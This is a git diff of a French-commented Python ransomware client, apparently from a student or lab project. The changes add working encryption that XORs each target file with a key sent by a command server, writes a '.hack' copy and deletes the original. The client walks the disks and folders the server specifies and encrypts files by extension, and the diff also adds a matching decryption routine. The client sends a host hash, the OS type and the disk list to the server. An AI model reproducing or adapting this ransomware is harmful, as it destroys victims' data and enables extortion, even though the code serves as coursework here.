history fait

+++ ransomware/ransomware.py
@@ -1,5 +1,4 @@
 import os
-import string
 import utile.network as network
 import utile.message as message
 import utile.config as config
@@ -11,7 +10,8 @@ import random
 import shutil
 import psutil
 import re
-from time import time
+from time import time as current_time
+import time
 
 # Constantes
 DEBUG_MODE = False
@@ -28,54 +28,6 @@ def initialize():
     global LAST_STATE
 
     # Vérifie si un hash est enregistré, sinon génère un hash
-    hash = config.get_config('HASH')
-    if hash is None:
-        hash = simulate_hash()
-        config.set_config('HASH', hash)
-        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-    # Détermine le type d'OS
-    os = os_type()
-    if os is None:
-        print("pas un windows")  # Si l'OS n'est pas un Microsoft Windows sortie du Ransomware
-
-    # Détermine les disques disponibles
-    disks = list_disks()
-    print(disks)
-
-    # Construction du message d'initialisation du RANSOMWARE
-    msg = message.set_message("initialize_req", [hash, os, disks])
-    # Sauvegarde des paramètres d'initialisation du Ransomware
-    config.set_config('OS', os)
-    config.set_config('DISKS', disks)
-    config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-
-    # Connection vers le serveur frontal
-    conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)
-
-    # Envoi de la demande d'initialisation vers le serveur frontal
-    network.send_message(conn_frontal, msg)
-    print("Le message : " + str(msg) + "est envoyé") # Il envoie ini req avec le hash dedans
-
-    # Réception de la configuration
-    msg = network.receive_message(conn_frontal)
-    msg_type = message.get_message_type(msg)
-    if msg_type == 'INITIALIZE_RESP':
-        print("Message reçu est INI_RESP")
-        # Fermeture de la connexion avec le serveur frontal
-        conn_frontal.close()
-
-        # Sauvegarde de la configuration réceptionnée
-        config.set_config('ID_DB', msg['CONFIGURE'])
-        config.set_config('DISKS', msg['SETTING']['DISKS'])
-        config.set_config('PATHS', msg['SETTING']['PATHS'])
-        config.set_config('FILE_EXT', msg['SETTING']['FILE_EXT'])
-        config.set_config('FREQ', msg['SETTING']['FREQ'])
-        config.set_config('LAST_STATE', 'INITIALIZE')  # Signifie que la configuration est complète
-        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-        # /!\ PAS DE SAUVEGARDE DE LA CLE DE CHIFFREMENT SUR DISQUE /!\
-        key_ransomware = msg['SETTING']['KEY']
-        # Changement d'état du ransomware
-        LAST_STATE = 'INITIALIZE'
 
 
 def os_type():
@@ -119,7 +71,11 @@ def file_type(fichier):
         return os.path.splitext(fichier)[1]
 
 
-def chiffre(fichier_source):
+def xor_cipher(key, data):
+    return bytearray(a ^ b for a, b in zip(bytearray(key), bytearray(data)))
+
+
+def chiffre(fichier_source, key):
     if not os.path.exists(fichier_source):
         print("Le fichier spécifié n'existe pas.")
         return ""
@@ -134,8 +90,40 @@ def chiffre(fichier_source):
     fichier_hacker = nom_fichier + ".hack"
 
     # Copie le contenu du fichier source vers le fichier cible
-    shutil.copyfile(fichier_source, fichier_hacker)
-    print(f"Fichier copié de {fichier_source} vers {fichier_hacker}")
+    with open(fichier_source, "rb") as file_source:
+        contenu = file_source.read()
+        contenu_chiffre = xor_cipher(key.encode(), contenu)
+
+    with open(fichier_hacker, "wb") as file_hack:
+        file_hack.write(contenu_chiffre)
+
+    # Supprime le fichier source
+    os.remove(fichier_source)
+    print(f"Fichier source {fichier_source} supprimé.")
+    return 1
+
+
+def dechiffre(fichier_source, key):
+    if not os.path.exists(fichier_source):
+        print("Le fichier spécifié n'existe pas.")
+        return ""
+
+    if not os.path.isfile(fichier_source):
+        print("Le chemin spécifié ne correspond pas à un fichier.")
+        return ""
+
+    # Obtient le nom du fichier sans extension
+    nom_fichier, extension = os.path.splitext(fichier_source)
+    # Crée le nouveau nom de fichier avec l'extension .hack
+    fichier_hacker = nom_fichier + ".safe"
+
+    # Copie le contenu du fichier source vers le fichier cible
+    with open(fichier_source, "rb") as file:
+        contenu = file.read()
+        contenu_dechiffre = xor_cipher(key.encode(), contenu)
+
+    with open(fichier_hacker, "wb") as f_dechiffre:
+        f_dechiffre.write(contenu_dechiffre)
 
     # Supprime le fichier source
     os.remove(fichier_source)
@@ -144,7 +132,7 @@ def chiffre(fichier_source):
 
 
 def simulate_hash(longueur=0):
-    identifiant = f'{node()}{time()}'
+    identifiant = f'{node()}{current_time()}'
     print(identifiant)
     return sha256(bytes()).hexdigest()
 
@@ -166,9 +154,54 @@ def main():
     # Vérifie le dernier état sauvegardé
     LAST_STATE = config.get_config('LAST_STATE')
     if LAST_STATE is None:
-        initialize()
+        hash = config.get_config('HASH')
+        if hash is None:
+            hash = simulate_hash()
+            config.set_config('HASH', hash)
+            config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
+        # Détermine le type d'OS
+        system = os_type()
+        if system is None:
+            print("pas un windows")  # Si l'OS n'est pas un Microsoft Windows sortie du Ransomware
 
-    if LAST_STATE == 'INITIALIZE' :
+        # Détermine les disques disponibles
+        disks = list_disks()
+        print(disks)
+
+        # Construction du message d'initialisation du RANSOMWARE
+        msg = message.set_message("initialize_req", [hash, system, disks])
+        # Sauvegarde des paramètres d'initialisation du Ransomware
+        config.set_config('OS', system)
+        config.set_config('DISKS', disks)
+        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
+
+        # Connection vers le serveur frontal
+        conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)
+
+        # Envoi de la demande d'initialisation vers le serveur frontal
+        network.send_message(conn_frontal, msg)
+        print("Le message : " + str(msg) + "est envoyé")  # Il envoie ini req avec le hash dedans
+
+        # Réception de la configuration
+        msg = network.receive_message(conn_frontal)
+        msg_type = message.get_message_type(msg)
+        conn_frontal.close()
+        if msg_type == 'INITIALIZE_RESP':
+            print("Message reçu est INI_RESP")
+            # Sauvegarde de la configuration réceptionnée
+            config.set_config('ID_DB', msg['CONFIGURE'])
+            config.set_config('DISKS', msg['SETTING']['DISKS'])
+            config.set_config('PATHS', msg['SETTING']['PATHS'])
+            config.set_config('FILE_EXT', msg['SETTING']['FILE_EXT'])
+            config.set_config('FREQ', msg['SETTING']['FREQ'])
+            config.set_config('LAST_STATE', 'INITIALIZE')  # Signifie que la configuration est complète
+            config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
+            # /!\ PAS DE SAUVEGARDE DE LA CLE DE CHIFFREMENT SUR DISQUE /!\
+            key_ransomware = msg['SETTING']['KEY']
+            # Changement d'état du ransomware
+            LAST_STATE = msg['SETTING']['STATE']
+
+    if LAST_STATE == 'INITIALIZE':
         state_config = config.get_config('LAST_STATE')
         if state_config != "INITIALIZE" and state_config != "CRYPT" and state_config != "PENDING":
             return None
@@ -179,36 +212,59 @@ def main():
             nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
         if nb_files_encrypted is None:
             nb_files_encrypted = 0
-
         disques = [chaine.replace("'", "") for chaine in disks]
         # Enlever les guillemets simples extérieurs de chaque élément de la liste
         extensions = []
-
         for element in file_ext:
             # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
             extensions.extend(element.replace("'", "").split(','))
         print(extensions)
-
         chemin = []
-
         for element in paths:
             # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
             chemin.extend(element.replace("'", "").split(','))
-
         print(chemin)
         # Enlever les guillemets simples extérieurs de chaque élément de la liste
+        # LAST_STATE = "CRYPT"
+        # config.set_config('LAST_STATE', 'CRYPT')
+        # config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
+        # cryptage = True
+        # while cryptage:
+        #
+        #     start_crypt = utile.message.set_message("CRYPT_START",hash )
+        #     network.send_message(conn_frontal, start_crypt)
+        #     time.sleep(5)
+
+        # Fermeture de la connexion avec le serveur frontal
+
         for disk in disques:
             os.chdir(disk)
-            print(disk)
             for folder_path in chemin:
                 for (root, dirs, files) in os.walk(folder_path, topdown=True):
                     for filename in files:
-                        print(filename)
                         if os.path.splitext(filename)[1] in extensions:  # Si l'extension est dans les types à chiffrer
-                            print(f"{root}\{filename}")
-                            nb_files_encrypted += chiffre(f"\{root}\{filename}")
-            print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
-        print("Chiffrement fait ? ")
+                            nb_files_encrypted += chiffre(f"\{root}\{filename}", key_ransomware)
+                print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
+            print("Chiffrement fait ? ")
+
+    if LAST_STATE == 'DECRYPT':
+        disks = config.get_config('DISKS')
+        paths = config.get_config('PATHS')
+        disques = [chaine.replace("'", "") for chaine in disks]
+        # Enlever les guillemets simples extérieurs de chaque élément de la liste
+        chemin = []
+        for element in paths:
+            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
+            chemin.extend(element.replace("'", "").split(','))
+        print(chemin)
+        for disk in disques:
+            os.chdir(disk)
+            for folder_path in chemin:
+                for (root, dirs, files) in os.walk(folder_path, topdown=True):
+                    for filename in files:
+                        if filename.endswith('.hack'):  # Si l'extension est dans les types à dechiffrer
+                            dechiffre(f"\{root}\{filename}", key_ransomware)
+                            print("Déchiffrement fait ")
 
 
 if __name__ == '__main__':
